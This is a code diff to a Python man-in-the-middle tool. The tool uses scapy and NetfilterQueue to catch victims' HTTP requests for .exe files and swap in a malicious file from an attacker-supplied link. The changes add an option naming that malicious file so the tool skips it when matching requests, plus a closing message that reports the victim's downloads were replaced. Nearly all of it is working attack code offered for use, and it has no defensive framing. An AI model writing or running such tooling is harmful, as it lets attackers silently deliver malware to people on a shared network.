@@ -8,10 +8,12 @@ def get_args():
     try:
         parser = optparse.OptionParser()
         parser.add_option("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
+        parser.add_option("-f", "--file", dest="filen", help="Name of the malicious file")
         (val, args) = parser.parse_args()
     except:
         parser = argparse.ArgumentParser()
         parser.add_argument("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
+        parser.add_argument("-f", "--file", dest="filen", help="Name of the malicious file")
         val = parser.parse_args()
     if not val.mal_link:
         parser.error("ERROR Missing argument, use --help for more info")
@@ -28,7 +30,7 @@ def work_packet(packet):
     use_packet = scapy.IP(packet.get_payload())
     if use_packet.haslayer(scapy.Raw):
         if use_packet[scapy.TCP].dport == 80:
-            if ".exe" in use_packet[scapy.Raw].load:
+            if ".exe" in use_packet[scapy.Raw].load and value.filen not in use_packet[scapy.Raw].load:
                 print("[+] Detected Download .exe file REQUEST...")
                 req_ack.append(use_packet[scapy.TCP].ack)
         elif use_packet[scapy.TCP].sport == 80:
@@ -43,4 +45,8 @@ def work_packet(packet):
 value = get_args()
 queue = netq.NetfilterQueue()
 queue.bind(0, work_packet)
-queue.run()
+try:
+    queue.run()
+except KeyboardInterrupt:
+    print("[-] Detected CTRL + C Quitting...")
+    print("[+] Download file replaced successfully for all downloads madeby Victim.")
